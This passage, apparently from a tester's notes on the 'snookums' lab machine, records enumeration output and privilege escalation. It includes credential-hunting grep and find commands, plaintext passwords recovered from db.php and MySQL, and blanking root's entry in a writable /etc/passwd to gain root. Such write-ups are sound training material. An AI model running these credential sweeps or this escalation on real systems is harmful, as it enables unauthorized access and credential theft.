drwxr-xr-x.  8 root root 4096 Jul 15  2020 html


find /home -name "*.txt" 2>/dev/null


find /home -type f -name "*history*" 2>/dev/null


find /home -type f -name "id_rsa" -o -name "id_*" 2>/dev/null


grep -Ri "password\|passwd\|secret\|token\|key" /home 2>/dev/null | head

find / -name "*.bak" -o -name "*~" 2>/dev/null | head


```

5. Automated Enumeration

```
Sudo version 1.8.23  

root      1043  0.0  0.0  53288   572 ?        Ss   20:41   0:00 /usr/sbin/vsftpd /etc/vsftpd/vsftpd.conf

tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -                                   
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN  

-rw-r--r--. 1 root root 475 Apr  7  2020 /usr/lib/firewalld/services/vnc-server.xml
<?xml version="1.0" encoding="utf-8"?>
<service>
  <short>Virtual Network Computing Server (VNC)</short>
  <description>A VNC server provides an external accessible X session. Enable this option if you plan to provide a VNC server with direct access. The access will be possible for displays :0 to :3. If you plan to provide access with SSH, do not open this option and use the via option of the VNC viewer.</description>                                
  <port protocol="tcp" port="5900-5903"/>
</service>

/usr/share/doc/vsftpd-3.0.2/

```
5. Possible PE Paths

```
getcap -r / 2>/dev/null
/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/newuidmap = cap_setuid+ep
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/suexec = cap_setgid,cap_setuid+ep

# This don't appear to be vulnerable

Sudo version 1.8.23
# Most of the exploit I found require you run sudo -l. I don't have apache password.  

-rw-r--r--. 1 root root 475 Apr  7  2020 /usr/lib/firewalld/services/vnc-server.xml
<?xml version="1.0" encoding="utf-8"?>
<service>
  <short>Virtual Network Computing Server (VNC)</short>
  <description>A VNC server provides an external accessible X session. Enable this option if you plan to provide a VNC server with direct access. The access will be possible for displays :0 to :3. If you plan to provide access with SSH, do not open this option and use the via option of the VNC viewer.</description>                                
  <port protocol="tcp" port="5900-5903"/>
</service>
# Did not see anything obvious that this could be used for privilege esculation.

MSQL 3306 33060
# Tried mysql -u root and mysql -u root 33060

root      1043  0.0  0.0  53288   572 ?        Ss   12:28   0:00 /usr/sbin/vsftpd /etc/vsftpd/vsftpd.conf
cd /etc/vsftpd
bash-4.2$ ls
ls
ftpusers  user_list  vsftpd.conf  vsftpd_conf_migrate.sh
bash-4.2$ ls -la
ls -la
total 32
drwxr-xr-x.  2 root root   88 Jun  9  2020 .
drwxr-xr-x. 79 root root 8192 Jan 13 13:31 ..
-rw-------.  1 root root  125 Apr  1  2020 ftpusers
-rw-------.  1 root root  361 Apr  1  2020 user_list
-rw-------.  1 root root 5116 Apr  1  2020 vsftpd.conf
-rwxr--r--.  1 root root  338 Apr  1  2020 vsftpd_conf_migrate.sh
bash-4.2$ cat vsftpd_conf_migrate.sh
cat vsftpd_conf_migrate.sh
#!/bin/bash
#move old config files and symlink them
#shipped with vsftpd-2.0.1-6
PREFIX="vsftpd"
for file in $( ls /etc/${PREFIX}.* ); do
    if [ ! -L $file ]; then
        new=`echo $file | sed s/${PREFIX}\./${PREFIX}\\\\//g | sed s/\.rpmsave//g`
        mv -f ${file} ${new}
        ln -s ${new} ${file}
        echo $file moved to $new
    fi
done


[+] SUID binaries
$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/su
/usr/bin/sudo
/usr/bin/mount
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/fusermount
/usr/bin/passwd
/usr/sbin/unix_chkpwd
/usr/sbin/pam_timestamp_check
/usr/sbin/usernetctl
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper

[+] SGID binaries
$ find / -perm -2000 -type f 2>/dev/null
/usr/bin/wall
/usr/bin/write
/usr/bin/ssh-agent
/usr/sbin/netreport
/usr/sbin/postdrop
/usr/sbin/postqueue
/usr/libexec/utempter/utempter

$ find / -writable -type d 2>/dev/null | head -n 50
/dev/mqueue
/dev/shm
/var/tmp
/var/lib/php/session
/var/lib/dav
/var/cache/httpd
/var/cache/httpd/proxy
/var/spool/samba
/tmp

CentOS version 7 Linux snookums 3.10.0-1127.10.1.el7.x86_64

bash-4.2$ cat db.php
cat db.php
<?php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', 'MalapropDoffUtilize1337');
define('DBNAME', 'SimplePHPGal');
?>



```

**Post-Exploitation**

1. Basic System Info

```
================================================================================
1) Identity & System Info
================================================================================

[+] whoami
$ whoami
michael

[+] id
$ id
uid=1000(michael) gid=1000(michael) groups=1000(michael) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

[+] hostname
$ hostname
snookums

[+] pwd
$ pwd
/home/michael

[+] uname -a
$ uname -a
Linux snookums 3.10.0-1127.10.1.el7.x86_64 #1 SMP Wed Jun 3 14:28:03 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

[+] os-release / issue
$ cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null
NAME="CentOS Linux"
VERSION="7 (Core)"
ID="centos"
ID_LIKE="rhel fedora"
VERSION_ID="7"
PRETTY_NAME="CentOS Linux 7 (Core)"
ANSI_COLOR="0;31"
CPE_NAME="cpe:/o:centos:centos:7"
HOME_URL="https://www.centos.org/"
BUG_REPORT_URL="https://bugs.centos.org/"

CENTOS_MANTISBT_PROJECT="CentOS-7"
CENTOS_MANTISBT_PROJECT_VERSION="7"
REDHAT_SUPPORT_PRODUCT="centos"
REDHAT_SUPPORT_PRODUCT_VERSION="7"



```

2. User Enumeration

```
================================================================================
2) Environment
================================================================================

[+] env
$ env
XDG_SESSION_ID=4
HOSTNAME=snookums
SELINUX_ROLE_REQUESTED=
TERM=xterm-256color
SHELL=/bin/bash
HISTSIZE=1000
SSH_CLIENT=192.168.45.151 36126 22
SELINUX_USE_CURRENT_RANGE=
SSH_TTY=/dev/pts/1
USER=michael
LS_COLORS=rs=0:di=38;5;27:ln=38;5;51:mh=44;38;5;15:pi=40;38;5;11:so=38;5;13:do=38;5;5:bd=48;5;232;38;5;11:cd=48;5;232;38;5;3:or=48;5;232;38;5;9:mi=05;48;5;232;38;5;15:su=48;5;196;38;5;15:sg=48;5;11;38;5;16:ca=48;5;196;38;5;226:tw=48;5;10;38;5;16:ow=48;5;10;38;5;21:st=48;5;21;38;5;15:ex=38;5;34:*.tar=38;5;9:*.tgz=38;5;9:*.arc=38;5;9:*.arj=38;5;9:*.taz=38;5;9:*.lha=38;5;9:*.lz4=38;5;9:*.lzh=38;5;9:*.lzma=38;5;9:*.tlz=38;5;9:*.txz=38;5;9:*.tzo=38;5;9:*.t7z=38;5;9:*.zip=38;5;9:*.z=38;5;9:*.Z=38;5;9:*.dz=38;5;9:*.gz=38;5;9:*.lrz=38;5;9:*.lz=38;5;9:*.lzo=38;5;9:*.xz=38;5;9:*.bz2=38;5;9:*.bz=38;5;9:*.tbz=38;5;9:*.tbz2=38;5;9:*.tz=38;5;9:*.deb=38;5;9:*.rpm=38;5;9:*.jar=38;5;9:*.war=38;5;9:*.ear=38;5;9:*.sar=38;5;9:*.rar=38;5;9:*.alz=38;5;9:*.ace=38;5;9:*.zoo=38;5;9:*.cpio=38;5;9:*.7z=38;5;9:*.rz=38;5;9:*.cab=38;5;9:*.jpg=38;5;13:*.jpeg=38;5;13:*.gif=38;5;13:*.bmp=38;5;13:*.pbm=38;5;13:*.pgm=38;5;13:*.ppm=38;5;13:*.tga=38;5;13:*.xbm=38;5;13:*.xpm=38;5;13:*.tif=38;5;13:*.tiff=38;5;13:*.png=38;5;13:*.svg=38;5;13:*.svgz=38;5;13:*.mng=38;5;13:*.pcx=38;5;13:*.mov=38;5;13:*.mpg=38;5;13:*.mpeg=38;5;13:*.m2v=38;5;13:*.mkv=38;5;13:*.webm=38;5;13:*.ogm=38;5;13:*.mp4=38;5;13:*.m4v=38;5;13:*.mp4v=38;5;13:*.vob=38;5;13:*.qt=38;5;13:*.nuv=38;5;13:*.wmv=38;5;13:*.asf=38;5;13:*.rm=38;5;13:*.rmvb=38;5;13:*.flc=38;5;13:*.avi=38;5;13:*.fli=38;5;13:*.flv=38;5;13:*.gl=38;5;13:*.dl=38;5;13:*.xcf=38;5;13:*.xwd=38;5;13:*.yuv=38;5;13:*.cgm=38;5;13:*.emf=38;5;13:*.axv=38;5;13:*.anx=38;5;13:*.ogv=38;5;13:*.ogx=38;5;13:*.aac=38;5;45:*.au=38;5;45:*.flac=38;5;45:*.mid=38;5;45:*.midi=38;5;45:*.mka=38;5;45:*.mp3=38;5;45:*.mpc=38;5;45:*.ogg=38;5;45:*.ra=38;5;45:*.wav=38;5;45:*.axa=38;5;45:*.oga=38;5;45:*.spx=38;5;45:*.xspf=38;5;45:
MAIL=/var/spool/mail/michael
PATH=/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/michael/.local/bin:/home/michael/bin
_=/usr/bin/env
PWD=/home/michael
LANG=en_US.UTF-8
SELINUX_LEVEL_REQUESTED=
HISTCONTROL=ignoredups
SHLVL=3
HOME=/home/michael
LOGNAME=michael
SSH_CONNECTION=192.168.45.151 36126 192.168.162.58 22
LESSOPEN=||/usr/bin/lesspipe.sh %s
XDG_RUNTIME_DIR=/run/user/1000

[+] set (first 50)
$ set 2>/dev/null | head -n 50
BASH=/usr/bin/bash
BASHOPTS=cmdhist:extquote:force_fignore:hostcomplete:interactive_comments:progcomp:promptvars:sourcepath
BASH_ALIASES=()
BASH_ARGC=()
BASH_ARGV=()
BASH_CMDS=()
BASH_EXECUTION_STRING='set 2>/dev/null | head -n 50'
BASH_LINENO=()
BASH_SOURCE=()
BASH_VERSINFO=([0]="4" [1]="2" [2]="46" [3]="2" [4]="release" [5]="x86_64-redhat-linux-gnu")
BASH_VERSION='4.2.46(2)-release'
DIRSTACK=()
EUID=1000
GROUPS=()
HISTCONTROL=ignoredups
HISTSIZE=1000
HOME=/home/michael
HOSTNAME=snookums
HOSTTYPE=x86_64
IFS=$' \t\n'
LANG=en_US.UTF-8
LESSOPEN='||/usr/bin/lesspipe.sh %s'
LOGNAME=michael
LS_COLORS='rs=0:di=38;5;27:ln=38;5;51:mh=44;38;5;15:pi=40;38;5;11:so=38;5;13:do=38;5;5:bd=48;5;232;38;5;11:cd=48;5;232;38;5;3:or=48;5;232;38;5;9:mi=05;48;5;232;38;5;15:su=48;5;196;38;5;15:sg=48;5;11;38;5;16:ca=48;5;196;38;5;226:tw=48;5;10;38;5;16:ow=48;5;10;38;5;21:st=48;5;21;38;5;15:ex=38;5;34:*.tar=38;5;9:*.tgz=38;5;9:*.arc=38;5;9:*.arj=38;5;9:*.taz=38;5;9:*.lha=38;5;9:*.lz4=38;5;9:*.lzh=38;5;9:*.lzma=38;5;9:*.tlz=38;5;9:*.txz=38;5;9:*.tzo=38;5;9:*.t7z=38;5;9:*.zip=38;5;9:*.z=38;5;9:*.Z=38;5;9:*.dz=38;5;9:*.gz=38;5;9:*.lrz=38;5;9:*.lz=38;5;9:*.lzo=38;5;9:*.xz=38;5;9:*.bz2=38;5;9:*.bz=38;5;9:*.tbz=38;5;9:*.tbz2=38;5;9:*.tz=38;5;9:*.deb=38;5;9:*.rpm=38;5;9:*.jar=38;5;9:*.war=38;5;9:*.ear=38;5;9:*.sar=38;5;9:*.rar=38;5;9:*.alz=38;5;9:*.ace=38;5;9:*.zoo=38;5;9:*.cpio=38;5;9:*.7z=38;5;9:*.rz=38;5;9:*.cab=38;5;9:*.jpg=38;5;13:*.jpeg=38;5;13:*.gif=38;5;13:*.bmp=38;5;13:*.pbm=38;5;13:*.pgm=38;5;13:*.ppm=38;5;13:*.tga=38;5;13:*.xbm=38;5;13:*.xpm=38;5;13:*.tif=38;5;13:*.tiff=38;5;13:*.png=38;5;13:*.svg=38;5;13:*.svgz=38;5;13:*.mng=38;5;13:*.pcx=38;5;13:*.mov=38;5;13:*.mpg=38;5;13:*.mpeg=38;5;13:*.m2v=38;5;13:*.mkv=38;5;13:*.webm=38;5;13:*.ogm=38;5;13:*.mp4=38;5;13:*.m4v=38;5;13:*.mp4v=38;5;13:*.vob=38;5;13:*.qt=38;5;13:*.nuv=38;5;13:*.wmv=38;5;13:*.asf=38;5;13:*.rm=38;5;13:*.rmvb=38;5;13:*.flc=38;5;13:*.avi=38;5;13:*.fli=38;5;13:*.flv=38;5;13:*.gl=38;5;13:*.dl=38;5;13:*.xcf=38;5;13:*.xwd=38;5;13:*.yuv=38;5;13:*.cgm=38;5;13:*.emf=38;5;13:*.axv=38;5;13:*.anx=38;5;13:*.ogv=38;5;13:*.ogx=38;5;13:*.aac=38;5;45:*.au=38;5;45:*.flac=38;5;45:*.mid=38;5;45:*.midi=38;5;45:*.mka=38;5;45:*.mp3=38;5;45:*.mpc=38;5;45:*.ogg=38;5;45:*.ra=38;5;45:*.wav=38;5;45:*.axa=38;5;45:*.oga=38;5;45:*.spx=38;5;45:*.xspf=38;5;45:'
MACHTYPE=x86_64-redhat-linux-gnu
MAIL=/var/spool/mail/michael
OPTERR=1
OPTIND=1
OSTYPE=linux-gnu
PATH=/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/michael/.local/bin:/home/michael/bin
PPID=5648
PS4='+ '
PWD=/home/michael
SELINUX_LEVEL_REQUESTED=
SELINUX_ROLE_REQUESTED=
SELINUX_USE_CURRENT_RANGE=
SHELL=/bin/bash
SHELLOPTS=braceexpand:hashall:interactive-comments
SHLVL=3
SSH_CLIENT='192.168.45.151 36126 22'
SSH_CONNECTION='192.168.45.151 36126 192.168.162.58 22'
SSH_TTY=/dev/pts/1
TERM=xterm-256color
UID=1000
USER=michael
XDG_RUNTIME_DIR=/run/user/1000
XDG_SESSION_ID=4
_=/usr/bin/bash

[+] PATH
$ echo "$PATH"
/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/michael/.local/bin:/home/michael/bin

[+] HOME and SHELL
$ echo "HOME=$HOME"; echo "SHELL=$SHELL"
HOME=/home/michael
SHELL=/bin/bash



```

3. Network Information

```
================================================================================
3) Users & Home Directories
================================================================================

[+] /etc/passwd
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
michael:x:1000:1000:Michael:/home/michael:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin

[+] home directories
$ ls -la /home
total 0
drwxr-xr-x.  3 root    root     21 Jun  9  2020 .
dr-xr-xr-x. 17 root    root    224 Jun  9  2020 ..
drwx------.  2 michael michael 158 Jan 13 14:48 michael

[+] root home (if accessible)
$ ls -la /root 2>/dev/null

[+] sudo -l
$ sudo -l 2>/dev/null
[sudo] password for michael: 

[+] sudo -V (first 10)
$ sudo -V 2>/dev/null | head -n 10
Sudo version 1.8.23
Sudoers policy plugin version 1.8.23
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.23

```

4. Software, Service, and Process Information

```
$ netstat -tulnp 2>/dev/null
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::3306                 :::*                    LISTEN      -                   
tcp6       0      0 :::139                  :::*                    LISTEN      -                   
tcp6       0      0 :::111                  :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::445                  :::*                    LISTEN      -                   
tcp6       0      0 :::33060                :::*                    LISTEN      -                   
udp        0      0 0.0.0.0:929             0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:111             0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:323           0.0.0.0:*                           -                   
udp6       0      0 :::929                  :::*                                -                   
udp6       0      0 :::111                  :::*                                -                   
udp6       0      0 ::1:323                 :::*                                -                   


samba-client-libs-4.10.4-11.el7_8.x86_64
rpcbind-0.2.0-49.el7.x86_64
```

4. Loot files.
```
================================================================================
3) Users & Home Directories
================================================================================

[+] /etc/passwd
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
michael:x:1000:1000:Michael:/home/michael:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin

[+] home directories
$ ls -la /home
total 0
drwxr-xr-x.  3 root    root     21 Jun  9  2020 .
dr-xr-xr-x. 17 root    root    224 Jun  9  2020 ..
drwx------.  2 michael michael 158 Jan 13 14:48 michael

[+] root home (if accessible)
$ ls -la /root 2>/dev/null

[+] sudo -l
$ sudo -l 2>/dev/null
[sudo] password for michael: 

[+] sudo -V (first 10)
$ sudo -V 2>/dev/null | head -n 10
Sudo version 1.8.23
Sudoers policy plugin version 1.8.23
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.23

[+] text files in /home
$ find /home -type f -name "*.txt" 2>/dev/null
/home/michael/local.txt
/home/michael/privesc_2026-01-13_144852.txt

[+] history files in /home
$ find /home -type f -name "*history*" 2>/dev/null
/home/michael/.bash_history

[+] ssh keys in /home
$ find /home -type f \( -name "id_rsa" -o -name "id_*" \) 2>/dev/null

[+] sensitive strings in /home (first 50)
$ grep -Ri "password\|passwd\|secret\|token\|key" /home 2>/dev/null | head -n 50
/home/michael/pg_privesc.sh:run_cmd "/etc/passwd" "cat /etc/passwd"
/home/michael/pg_privesc.sh:run_cmd "grep password in /etc (first 50)" "grep -R \"password\" /etc 2>/dev/null | head -n 50"
/home/michael/pg_privesc.sh:run_cmd "web creds (first 50)" "grep -R \"password\\|db\\|user\" /var/www 2>/dev/null | head -n 50"
/home/michael/pg_privesc.sh:run_cmd "ssh keys in /home" "find /home -type f \\( -name \"id_rsa\" -o -name \"id_*\" \\) 2>/dev/null"
/home/michael/pg_privesc.sh:run_cmd "sensitive strings in /home (first 50)" "grep -Ri \"password\\|passwd\\|secret\\|token\\|key\" /home 2>/dev/null | head -n 50"
/home/michael/privesc_2026-01-13_144852.txt:[+] /etc/passwd
/home/michael/privesc_2026-01-13_144852.txt:$ cat /etc/passwd
/home/michael/privesc_2026-01-13_144852.txt:/proc/1/task/1/attr/keycreate
/home/michael/privesc_2026-01-13_144852.txt:/proc/1/attr/keycreate
/home/michael/privesc_2026-01-13_144852.txt:/proc/2/task/2/attr/keycreate
/home/michael/privesc_2026-01-13_144852.txt:/proc/2/attr/keycreate
/home/michael/privesc_2026-01-13_144852.txt:/proc/4/task/4/attr/keycreate
/home/michael/privesc_2026-01-13_144852.txt:/proc/4/attr/keycreate
/home/michael/privesc_2026-01-13_144852.txt:/proc/6/task/6/attr/keycreate
/home/michael/privesc_2026-01-13_144852.txt:/proc/6/attr/keycreate
/home/michael/privesc_2026-01-13_144852.txt:/proc/7/task/7/attr/keycreate
/home/michael/privesc_2026-01-13_144852.txt:/proc/7/attr/keycreate
/home/michael/privesc_2026-01-13_144852.txt:/usr/bin/gpasswd
/home/michael/privesc_2026-01-13_144852.txt:/usr/bin/passwd
/home/michael/privesc_2026-01-13_144852.txt:/usr/libexec/openssh/ssh-keysign
/home/michael/privesc_2026-01-13_144852.txt:keyutils-libs-1.5.8-3.el7.x86_64
/home/michael/privesc_2026-01-13_144852.txt:gpg-pubkey-f4a80eb5-53a7ff4b
/home/michael/privesc_2026-01-13_144852.txt:[+] grep password in /etc (first 50)
/home/michael/privesc_2026-01-13_144852.txt:$ grep -R "password" /etc 2>/dev/null | head -n 50
/home/michael/privesc_2026-01-13_144852.txt:/etc/pki/tls/openssl.cnf:# input_password = secret
/home/michael/privesc_2026-01-13_144852.txt:/etc/pki/tls/openssl.cnf:# output_password = secret
/home/michael/privesc_2026-01-13_144852.txt:/etc/pki/tls/openssl.cnf:challengePassword          = A challenge password
/home/michael/privesc_2026-01-13_144852.txt:Binary file /etc/pki/nssdb/key3.db matches
/home/michael/privesc_2026-01-13_144852.txt:Binary file /etc/pki/nssdb/key4.db matches
/home/michael/privesc_2026-01-13_144852.txt:Binary file /etc/openldap/certs/key3.db matches
/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:  DESC 'MD4 hash of the unicode password'
/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:  DESC 'Timestamp of the last password update'
/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:  DESC 'Timestamp of when the user is allowed to update the password'
/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:  DESC 'Timestamp of when the password will expire'
/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:  DESC 'Bad password attempt count'
/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:  DESC 'Time of the last bad password attempt'
/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:  DESC 'Concatenated MD5 hashes of the salted NT passwords used on this account'
/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:# "min password length"
/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:  DESC 'Minimal password length (default: 5)'
/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:# "password history"
/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:# "user must logon to change password"
/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:  DESC 'Force Users to logon for password change (default: 0 => off, 2 => on)'
/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:# "maximum password age"
/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:  DESC 'Maximum password age, in seconds (default: -1 => never expire passwords)'
/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:# "minimum password age"
/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:  DESC 'Minimum password age, in seconds (default: 0 => allow immediate password change)'
/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:# "refuse machine password change"
/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:  DESC 'Clear text password (used for trusted domain passwords)'
/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:  DESC 'Previous clear text password (used for trusted domain passwords)'
/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:## Trust password for trust relationships (any kind)

[+] backup files (first 50)
$ find / -name "*.bak" -o -name "*~" 2>/dev/null | head -n 50
/etc/nsswitch.conf.bak

================================================================================
10) Containers / Virtualization
================================================================================

[+] docker env file
$ ls -la /.dockerenv 2>/dev/null

[+] cgroup hints
$ grep -i docker /proc/1/cgroup 2>/dev/null


```

5. Automated Enumeration

```

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                                                                                   
/etc/passwd



```
5. Possible PE Paths

```
/etc/passwd is owned by user Michael.


```



**Privilege Escalation**

1. PE Steps
Apache to Michael

- Remembered that there was a db.php file on the root of the website from doing web recon. Navigated to /var/www/html/db.php and viewed. 
![[Pasted image 20260113123350.png]]
- Logged into mysql using found credentials.
```
mysql -u root -p
mysql -u root -p
Enter password: MalapropDoffUtilize1337
```
![[Pasted image 20260113123513.png]]

- Viewed databases, selected SimplePHPGal DB, and view tables.
```
show databases;
use SimplePHPGal;
show tables;
select * from users;
```
![[Pasted image 20260113123807.png]]

- Since I knew there was a Michael account, I cracked password string using Cyberchef. 
![[Pasted image 20260113123908.png]]

- Used Michael:HockSydneyCertify123 to ssh into host had obtain local.txxt
![[Pasted image 20260113124128.png]]

2. PE Steps Michael to Root.

- Noticed that /etc/passwd is owned by user Michael when running linpeas.sh.
![[Pasted image 20260113145413.png]]
- Edited the root user in the /etc/passwd file to remove password. 
```
vi /etc/passwd
root::0:0:root:/root:/bin/bash
:wq!
```
![[Pasted image 20260113145933.png]]

- Switched user to root.
```
su root
cat /root/proof.txt
```
![[Pasted image 20260113150042.png]]

3. Notes

```

```

